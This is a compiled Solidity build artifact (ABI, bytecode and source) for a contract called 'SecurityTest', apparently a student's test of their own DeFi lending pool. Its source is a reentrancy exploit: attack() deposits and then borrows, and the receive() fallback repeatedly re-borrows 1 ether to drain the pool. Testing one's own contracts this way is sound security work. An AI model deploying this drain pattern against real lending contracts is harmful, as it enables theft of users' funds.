{
  "contractName": "SecurityTest",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract LendingPoolUpgradeable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b50604051610577380380610577833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b61046b8061010c5f395ff3fe60806040526004361061002c575f3560e01c80639e5faafc1461010b578063d4b839921461011557610107565b36610107575f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16319050670de0b6b3a76400008110610105575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5ebeaec670de0b6b3a76400006040518263ffffffff1660e01b81526004016100db91906102f2565b5f604051808303815f87803b1580156100f2575f80fd5b505af1925050508015610103575060015b505b005b5f80fd5b61011361013f565b005b348015610120575f80fd5b50610129610284565b604051610136919061037c565b60405180910390f35b5f3411610181576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610178906103ef565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101e6575f80fd5b505af11580156101f8573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5ebeaec346040518263ffffffff1660e01b8152600401610255919061041c565b5f604051808303815f87803b15801561026c575f80fd5b505af115801561027e573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f819050919050565b5f819050919050565b5f819050919050565b5f6102dc6102d76102d2846102a7565b6102b9565b6102b0565b9050919050565b6102ec816102c2565b82525050565b5f6020820190506103055f8301846102e3565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61034461033f61033a8461030b565b6102b9565b61030b565b9050919050565b5f6103558261032a565b9050919050565b5f6103668261034b565b9050919050565b6103768161035c565b82525050565b5f60208201905061038f5f83018461036d565b92915050565b5f82825260208201905092915050565b7f53656e642045544820746f2073746172742061747461636b00000000000000005f82015250565b5f6103d9601883610395565b91506103e4826103a5565b602082019050919050565b5f6020820190508181035f830152610406816103cd565b9050919050565b610416816102b0565b82525050565b5f60208201905061042f5f83018461040d565b9291505056fea2646970667358221220f5d186e5d4a3d4e4b7d619d480e7e45a99f331ed470ca3ee81c8bc07f82be97864736f6c63430008140033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./LendingPoolUpgradeable.sol\";\n\ncontract SecurityTest {\n\n    LendingPoolUpgradeable public target;\n\n    // FIX: make address payable\n    constructor(address payable _target) {\n        target = LendingPoolUpgradeable(_target);\n    }\n\n    // Start the attack\n    function attack() external payable {\n        require(msg.value > 0, \"Send ETH to start attack\");\n\n        // Deposit into the pool\n        target.deposit{value: msg.value}();\n\n        // Try to exploit reentrancy\n        target.borrow(msg.value);\n    }\n\n    // Fallback for reentrancy loop\n    receive() external payable {\n        uint256 poolBalance = address(target).balance;\n\n        if (poolBalance >= 1 ether) {\n            try target.borrow(1 ether) {\n\n            } catch {\n\n            }\n        }\n    }\n}",
  "sourcePath": "D:\\Downloads\\Blockchain\\TY SEM2\\DeFiEnterprise\\blockchain\\contracts\\SecurityTest.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.a1b79de6.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-03-30T06:25:46.936Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}